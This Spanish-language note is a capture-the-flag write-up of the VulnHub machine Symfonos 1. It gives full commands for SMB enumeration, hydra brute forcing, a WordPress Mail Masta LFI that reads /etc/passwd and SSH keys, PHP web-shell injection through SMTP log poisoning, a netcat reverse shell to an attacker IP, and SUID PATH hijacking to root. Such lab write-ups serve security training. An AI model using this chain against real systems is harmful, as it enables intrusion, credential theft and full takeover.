---
tags:
  - type/writeup
  - estado/completo
plataforma: "[[VulnHub]]"
web: 
dificultad: Fácil
os: Linux
relacionados:
  - "[[smbclient]]"
  - "[[smbmap]]"
  - "[[hydra]]"
  - "[[searchsploit]]"
  - "[[Virtual Hosting]]"
  - "[[telnet]]"
  - "[[SMTP]]"
  - "[[Mejora de terminal interactiva]]"
  - "[[File Inclusion|LFI]]"
  - "[[Log Poisoning]]"
  - "[[samba]]"
  - "[[WordPress]]"
---
#  VulnHub - Symfonos 1

## Reconocimiento

### Escaneo de red

- `arp-scan`:
    ```bash
    sudo arp-scan -I eth0 --localnet
    ```
    
- `ping` con registro de ruta:
    ```bash
    ping -c 1 [IP_victima] -R
    ```
    
### Escaneo de puertos y servicios

- Escaneo de todos los puertos:
    ```bash
    nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn [IP_victima] -oG nmap/allports
    ```
    
- Escaneo específico de servicios:
    ```bash
    nmap -sCV -p22,25,80,139,445 [IP_victima] -oN nmap/target
    ```

### Búsqueda en Google

- Identificación del sistema operativo basado en versiones:
    - `launchpad OpenSSH 7.4p1 Debian 10+deb9u6` indica Debian Stretch.
    - `launchpad Apache httpd 2.4.25` confirma también Debian Stretch.

En ambos casos veo que dice Debian Stretch, si viera otra cosa podría pensar en que tal vez pudiera haber cosas corriendose dentro de contenedores docker. 

### Análisis de servicios web

- Análisis con `whatweb`:
    ```bash
    whatweb [IP_victima]
    ```

- Entro a la web y no veo nada.

- Intento de listar recursos compartidos de Samba, encuentro una nota al entrar en:
    ```bash
    smbclient -N \\\\[IP_victima]\\anonymous
    ```
	La nota da posibles contraseñas. 
    
- Enumeración de usuarios en SSH vulnerable con [[searchsploit]]:
    ```bash
    searchsploit SSH 7.4
    searchsploit -m linux/remote/45939.py
    ```
	Encuentro que la version 7.4 de ssh es vulnerable a enumeración de usuarios.
	
- Descargo el archivo `.py` 
	```bash
	searchsploit -m linux/remote/45939.py
	```
	Parece que está parcheado y ponga el usuario que ponga me dice que el usuario es valido. Así que no es por ahí. 

### Revisión adicional de Samba

Vuelvo a revisar [[samba]] ya que había visto un archivo compartido que podría ser el nombre de un usuario. 

##### **Con [[smbclient]] (elegir 1):**

- Conexión al usuario:
```bash
	smbmap -H [IP_victima] -u helios -p qwerty
```
- Ver archivos:
```bash
	ls
```
- Descarga de archivos:
```bash
	get research.txt
	get todo.txt
```

O

```bash
smbclient \\\\172.16.217.129\\helios -U helios
# pass qwerty
```
##### **O con [[smbmap]] (elegir 1):**

- Conexión exitosa con usuario y contraseña:
	```bash
	smbclient [IP_victima] -U helios
	```
- Exploración de archivos compartidos:
    ```bash
    smbmap -H [IP_victima] -u helios -p qwerty -r helios
    ```
- Descarga de archivos:
	```bash
	smbmap -H [IP_victima] -u helios -p qwerty --download helios/todo.txt
	smbmap -H [IP_victima] -u helios -p qwerty --download helios/research.txt
	```

En el archivo `todo.txt` encuentro una ruta, pruebo de agregarla a la web y me carga una nueva dirección.

### Configuración de [[Virtual Hosting]]

Al ver el codigo fuente de `http://192.168.0.189/h3l105` me encuentro con que todo lo carga de symfonos.local, por lo que está usando virtual hosting. Así que agrego la ip y la redirijo a `symfonos.local` en el `/etc/hosts`.

- Edición de `/etc/hosts`:
    ```
    symfonos.local [IP_victima]
    ```

	Ahora sí al cargar `http://symfonos.local/h3l105/` o nuevamente `http://192.168.0.189/h3l105` me encuentro con que la carga adecuadamente.

___

## Análisis de vulnerabilidades

### Busco conexión por [[SSH (22) - Enumeración|SSH]]

- Intento de fuerza bruta con [[hydra]] para SSH con el usuario `Zeus` y `Helios` para las posibles contraseñas que estaba en la parte de `anonymous` del Samba: 
    ```bash
    hydra -L users.txt -P passwords.txt ssh://[IP_victima]
    ```
    No encuentra nada, así que zeus no es uno de los usuarios que usa esa contraseña. 

### Exploración del sitio web con [[wpscan]] (forma automática):

- Busco información débil o relevante en el [[WordPress]]
```bash
wpscan --url http://symfonos.local/h3l105/ --enumerate t
```
- `--enumerate`: Habilita la enumeración de componentes en WordPress.
- `-t`: Especifica que quieres enumerar los temas instalados en el sitio.

Encuentra el usuario `admin` y `plugins` vulnerables.

### Análisis de plugins en [[WordPress]] (forma manual):]

- Veo en el codigo fuente los plugins, intento ver si tiene los plugins expuestos yendo a `/wp-content/plugins/`.  Resulta que no funciona, no se ve nada.

- Identificación de recursos en `wp-content`:
    ```bash
    curl -s -X GET 'http://symfonos.local/h3l105/' | grep "wp-content" | grep -oP "'.*?'" | cut -d '/' -f 1-7 | sort -u | grep plugins
    ```
- `-o (--only-matching)`: Hace que grep solo muestre las partes de la línea que coinciden con el patrón, en lugar de la línea completa.
- `-P (--perl-regexp)`: Permite usar expresiones regulares en el estilo de Perl, que son más avanzadas que las POSIX estándar.

> [!TIP] Explicación
	>La expresión regular `'.*?'` se desglosa de la siguiente manera:
	>- **`.`**: Coincide con cualquier carácter, excepto saltos de línea.
	>- **`*`**: Indica que puede haber cero o más repeticiones del carácter anterior (en este caso, cualquier carácter).
	>- **`?`**: Hace que el `*` sea "no codicioso" (lazy), es decir, que intente coincidir con la menor cantidad posible de caracteres, deteniéndose en el primer cierre de comillas (`'`).

- Identificación de vulnerabilidades en plugin `mail masta`:
    ```bash
    searchsploit mail masta
    ```
    Veo un LFI y un SQLI.

### Explotación de LFI

Agregando lo que dice el script a la url, me logro aprovechar de un LFI y leer el `/etc/passwd`:
```http
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

- SI quiero evitar verlo desde la web y prefiero verlo desde la terminal puedo usar:
    ```bash
    curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
    ```

- Sigo avanzando buscando más información: 
```bash
curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd" | grep sh$
```

- Enumeración de claves privadas SSH:
    ```bash
    curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/home/helios/.ssh/id_rsa"
    ```

- Pruebo otras alternativas:
```bash
curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/proc/schedstat"
```
```bash
curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/proc/scheddebug"
```

- Análisis de logs:
    ```bash
    curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/log/apache2/access.log"
    
    curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/log/auth.log"
    ```

- Recordando que el `nmap` habia dado un [[SMTP]] puedo revisar el log del mail:
	```bash
	curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios"
	```
	Puedo ver el contenido.

### Análisis de logs de correo

Puedo intentar crear un log con código php para ver si es interpretado:

- Conexión mediante [[telnet]] por el puerto 25:
    ```bash
    telnet [IP_victima] 25
    ```
    
- Inyección de código PHP:
    ```bash
    MAIL FROM: v # Pongo mail de destino y quien lo recibe
    RCPT TO: helios # Pongo para que lo reciba helios porque sé que existe
    DATA # Pongo data para escribir el contenido
    <?php system ($_GET['cmd']); ?> # Inyecto el codigo php
    . # termina cuando pongo un `.`
    ```
    Me responde: `250 2.0.0 Ok: queued as 09AC240873`

___
## Explotación de vulnerabilidades

### Ejecución remota de comandos

Al volver a revisar el log del mail veo el email pero no el contenido, sin embargo si ejecuto un comando desde la URL o la terminal, el comando funciona

- Ejecución de comandos mediante LFI:
    ```bash
    curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=whoami"
    ```
    Esto funciona porque he logrado inyectar codigo php en el cuerpo del mensaje de los logs. 

### Obtención de reverse shell

- Configuración de listener:
    ```bash
    nc -lvnp 443
    ```
    
- Envío de reverse shell:
    ```bash
    curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=nc+-e+/bin/bash+192.168.0.252+443"
    ```

___

## Escalada de privilegios

### Mejora de la terminal interactiva

[[Mejora de terminal interactiva]]

### Accediendo a root con [[PATH Hijacking]]

- Busco [[SUID]] en el sistema
	```bash
	find / -perm -4000 -user root 2>/dev/null
	```

- Encuentro un archivo poco convencional que se llama: `/opt/statuscheck` lo reviso para ver si encuentro alguna ruta relativa: 
	```bash
	strings /opt/statuscheck	
	```

- Encuentro que tiene un `curl` que está usando de forma relativa así que paso a explotarlo. 
	```bash
	cd /tmp

	echo 'chmod u+s /bin/bash'

	export PATH=/tmp:$PATH

	chmod +x curl
	```
o
```bash
	echo “/bin/sh” > curl
```

- Ejecuto el archivo, le da `SUID` a `/bin/bash` y accedo:
	```bash
	bash -p
	```
o
- Entra directo en caso de haber usado la segunda opción.

Listo, tengo acceso root.

### Pivoting

#### Preparación para Symfonos 2

- Configuración de túneles y análisis de la nueva máquina objetivo.

## Bandera(s)

> [!FLAG] `flag{B4nd3r4}`
^bandera
